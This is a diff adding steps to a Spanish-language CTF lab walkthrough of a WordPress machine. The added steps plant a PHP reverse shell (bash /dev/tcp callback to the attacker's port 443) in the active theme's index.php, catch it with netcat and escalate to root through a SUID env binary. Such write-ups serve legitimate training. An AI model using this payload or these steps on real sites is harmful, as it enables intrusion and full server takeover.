@@ -107,5 +107,52 @@ Accedemos en `http://172.17.0.2/wordpress/wp-login.php`
 
 Estamos dentro de la sesión de wordpress de mario. 
 
-Si accedemos al apartado de usuarios, podemos ver que mario es el único usuario activo y que tiene perfil de administrador, con lo que somos administradores de la web. Como no hay forma de acceder a una sesión de comandos puesto que es un CMS y tampoco hay más puertos en la máquina podemos concluir que hemos finalizado la máquina. 
+Aún podemos conseguir una línea de comandos que nos permita ser root. Para ello vamos a Apariencia > Theme Code Editor seleccionando el tema activo Twenty Twenty- Two. Para ello tenemos que modificar un archivo PHP del tema, en este caso index.php para introducir código PHP que permita ejecutar comandos en el servidor. Luego accederemos a ese código mediante una petición HTTP para conseguir ejecución de comandos con los privilegios del proceso de WordPress.
 
+Vamos a pegar el siguiente código php arriba del todo:
+```bash
+ <?php
+ exec("/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'");
+ ?>
+```
+Y guardamos.
+
+<img width="1908" height="705" alt="imagen" src="https://github.com/user-attachments/assets/77cd655f-9daf-4f3f-b487-b602134b1ac3" />
+
+
+Esto si se ejecuta en el servidor nos concede acceso a una shell de bash del servidor siempre que tengamos un listener activo en nuestra máquina en el puerto 443 tal y como le especificamos. Por tanto en Kali:
+```bash
+nc -lnvp 443
+```
+
+Para que se ejecute:
+```bash
+curl -s http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php
+```
+
+Acabamos de obtener acceso al servidor:
+<img width="1030" height="180" alt="imagen" src="https://github.com/user-attachments/
+ assets/3139855c-428a-42e8-9736-eb95ecf723b4" />
+
+---
+ **Escalada de privilegios**
+
+ Por último, solo nos queda escalar privilegios. 
+
+ Para escalar privilegios podemos ejecutar los comandos básicos de escalada y linpeas en caso de no ver nada:
+ ```bash
+sudo -l
+cat /etc/crontab
+find / -perm -4000 -user root -type f 2>/dev/null
+```
+ Con este último comando de setuid encontramos archivos interesantes con este bit activado.
+ 
+<img width="1551" height="270" alt="imagen" src="https://github.com/user-attachments/assets/0e4870c9-3a0f-4f14-9873-f4c3b00ebbe5" />
+
+El que más nos puede interesar es env. Miramos en GTFOBins un comando de escalada para env y encontramos esto:
+
+<img width="948" height="563" alt="imagen" src="https://github.com/user-attachments/assets/50829c51-43bc-48a3-965d-6279124ebe96" />
+
+<img width="1210" height="117" alt="imagen" src="https://github.com/user-attachments/assets/4c1059c2-fd15-4219-ab6d-82210b4fb7a7" />
+
+Hemos alcanzado privilegios máximos en el sistema!
